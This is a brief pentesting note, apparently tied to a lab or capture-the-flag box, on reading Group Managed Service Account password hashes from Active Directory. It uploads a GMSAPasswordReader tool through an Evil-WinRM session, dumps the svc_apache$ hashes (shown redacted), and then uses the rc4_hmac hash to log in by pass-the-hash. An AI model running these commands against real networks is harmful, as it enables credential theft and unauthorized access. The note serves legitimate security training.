# GMSA

> Group Managed Service Accounts (GMSA)
>
> Group Managed Service Accounts provide a higher security option for non-interactive applications, services, processes, or tasks that run automatically but need a security credential.
>
> These service accounts are given automatically-generated passwords. Given certain permissions, it is possible to retrieve these password hashes from Active Directory. To see what users or groups have permissions to do that for a given service account, we can look up the PrincipalsAllowedToRetrieveManagedPassword user property on the account.

[https://github.com/CsEnox/tools/raw/main/GMSAPasswordReader.exe](https://github.com/CsEnox/tools/raw/main/GMSAPasswordReader.exe)

```
*Evil-WinRM* PS C:\Users\enox\Desktop> upload GMSAPasswordReader.exe

*Evil-WinRM* PS C:\USers\enox\Documents> ./GMSAPasswordReader.exe --accountname svc_apache
Calculating hashes for Old Value
[*] Input username             : svc_apache$
[*] Input domain               : HEIST.OFFSEC
[*] Salt                       : HEIST.OFFSECsvc_apache$
[*]       rc4_hmac             : [REDACTED]
[*]       aes128_cts_hmac_sha1 : [REDACTED]
[*]       aes256_cts_hmac_sha1 : [REDACTED]
[*]       des_cbc_md5          : [REDACTED]

Calculating hashes for Current Value
[*] Input username             : svc_apache$
[*] Input domain               : HEIST.OFFSEC
[*] Salt                       : HEIST.OFFSECsvc_apache$
[*]       rc4_hmac             : [REDACTED]
[*]       aes128_cts_hmac_sha1 : [REDACTED]
[*]       aes256_cts_hmac_sha1 : [REDACTED]
[*]       des_cbc_md5          : [REDACTED]
```

Current Value -> rc4\_hmac

```
$ evil-winrm -u 'svc_apache$' -H [REDACTED]-i 192.168.147.165
```
